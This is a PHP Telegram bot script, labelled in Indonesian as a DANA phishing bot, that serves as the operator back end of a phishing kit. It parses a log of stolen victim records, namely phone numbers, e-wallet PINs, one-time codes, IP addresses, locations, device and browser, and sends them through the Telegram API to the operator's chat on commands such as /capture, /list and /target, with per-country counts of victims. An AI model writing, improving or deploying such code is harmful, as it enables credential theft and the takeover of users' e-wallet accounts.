<?php
require 'config.php';

$update = json_decode(file_get_contents('php://input'), true);

function sendMsg($chat_id, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $post = ['chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'MarkdownV2'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

function esc($t) {
    $chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($chars as $c) $t = str_replace($c, '\\' . $c, $t);
    return $t;
}

function parseEntry($entry) {
    $lines = explode("\n", trim($entry));
    $d = [];
    foreach ($lines as $line) {
        if (strpos($line, ':') !== false) {
            list($k, $v) = explode(':', $line, 2);
            $d[trim($k)] = trim($v);
        }
    }
    return $d;
}

function formatEntry($d) {
    $p  = "┌─── 📱 *DATA TARGET* ───\n";
    $p .= "│ 📞 Nomor : `" . esc($d['TARGET'] ?? '-') . "`\n";
    $p .= "│ 🔐 PIN   : `" . esc($d['PIN'] ?? '-') . "`\n";
    if (!empty($d['OTP'])) $p .= "│ 🔑 OTP   : `" . esc($d['OTP']) . "`\n";
    $p .= "│ 🕒 Waktu : " . esc($d['Waktu'] ?? '-') . "\n";
    $p .= "│ 🔖 Ref   : `" . esc($d['Ref'] ?? '-') . "`\n";
    $p .= "└──────────────────────────\n";
    $p .= "┌─── 🌐 *INFO TARGET* ───\n";
    $p .= "│ 🌍 IP     : `" . esc($d['IP'] ?? '-') . "`\n";
    $p .= "│ 🗺️ Negara : " . esc($d['Negara'] ?? '-') . "\n";
    $p .= "│ 🏙️ Kota   : " . esc($d['Kota'] ?? '-') . "\n";
    $p .= "│ 📡 ISP    : " . esc($d['ISP'] ?? '-') . "\n";
    $p .= "│ 📍 Koord  : `" . esc($d['Koordinat'] ?? '-') . "`\n";
    $p .= "│ 📲 Device : " . esc(substr($d['Device'] ?? '-', 0, 40)) . "\n";
    $p .= "│ 🌐 Browser: " . esc($d['Browser'] ?? '-') . "\n";
    $p .= "└──────────────────────────\n";
    return $p;
}

if (isset($update['message'])) {
    $chat_id = $update['message']['chat']['id'];
    $text = $update['message']['text'] ?? '';

    if ($text == '/start') {
        $reply  = "╔══════════════════════════╗\n";
        $reply .= "║  👑 *BOT LYNXIEEx*  ║\n";
        $reply .= "║  *DANA PHISING* 👑  ║\n";
        $reply .= "╚══════════════════════════╝\n\n";
        $reply .= "Halo\\! Aku bot pelacak otomatis DANA\\.\n\n";
        $reply .= "📋 *COMMAND:*\n";
        $reply .= "`/capture` — Data terbaru\n";
        $reply .= "`/list`    — Semua data\n";
        $reply .= "`/target`  — Statistik target\n";
        $reply .= "`/help`    — Bantuan\n\n";
        $reply .= "🛡️ _Powered by LYNXIEEx_ 👑";
        sendMsg($chat_id, $reply);
    }

    if ($text == '/help') {
        $reply  = "📖 *BANTUAN BOT LYNXIEEx* 👑\n\n";
        $reply .= "`/capture` — Lihat data terakhir yang masuk\n";
        $reply .= "`/list` — Lihat semua data yang tersimpan\n";
        $reply .= "`/target` — Statistik total target\n";
        $reply .= "`/start` — Menu utama\n\n";
        $reply .= "_Bot otomatis menangkap data dari halaman phishing\\._";
        sendMsg($chat_id, $reply);
    }

    if ($text == '/capture') {
        if (!file_exists(LOG_FILE)) {
            sendMsg($chat_id, "❌ Belum ada data\\.");
        } else {
            $log = file_get_contents(LOG_FILE);
            $entries = array_filter(explode("========================================", $log));
            $last = trim(end($entries));
            if ($last) {
                $d = parseEntry($last);
                $msg  = "🔥 *DATA TERBARU* 🔥\n\n";
                $msg .= formatEntry($d);
                $msg .= "\n👑 *BOT LYNXIEEx DANA PHISING* 👑";
                sendMsg($chat_id, $msg);
            } else {
                sendMsg($chat_id, "❌ Belum ada data\\.");
            }
        }
    }

    if ($text == '/list') {
        $log = file_get_contents(LOG_FILE);
        $entries = array_filter(explode("========================================", $log));
        if (empty($entries)) {
            sendMsg($chat_id, "❌ Belum ada data\\.");
        } else {
            $no = 1;
            $reply = "📋 *DAFTAR SEMUA DATA* 👑\n\n";
            foreach ($entries as $entry) {
                $d = parseEntry($entry);
                $reply .= "*$no\\.* `" . esc($d['TARGET'] ?? '-') . "`";
                $reply .= " — " . esc($d['Kota'] ?? '-') . "\n";
                $reply .= "    Ref: `" . esc($d['Ref'] ?? '-') . "`\n";
                $no++;
            }
            $reply .= "\nTotal: *" . count($entries) . "* target\n";
            $reply .= "👑 _LYNXIEEx_";
            sendMsg($chat_id, $reply);
        }
    }

    if ($text == '/target') {
        $log = file_get_contents(LOG_FILE);
        $entries = array_filter(explode("========================================", $log));
        $total = count($entries);
        $negara = [];
        foreach ($entries as $entry) {
            $d = parseEntry($entry);
            $n = $d['Negara'] ?? 'Unknown';
            $negara[$n] = ($negara[$n] ?? 0) + 1;
        }
        $reply  = "📊 *STATISTIK LYNXIEEx* 👑\n\n";
        $reply .= "🎯 Total target : *$total*\n\n";
        $reply .= "*Per Negara:*\n";
        foreach ($negara as $n => $c) {
            $reply .= "• " . esc($n) . " : *$c*\n";
        }
        sendMsg($chat_id, $reply);
    }
}
?>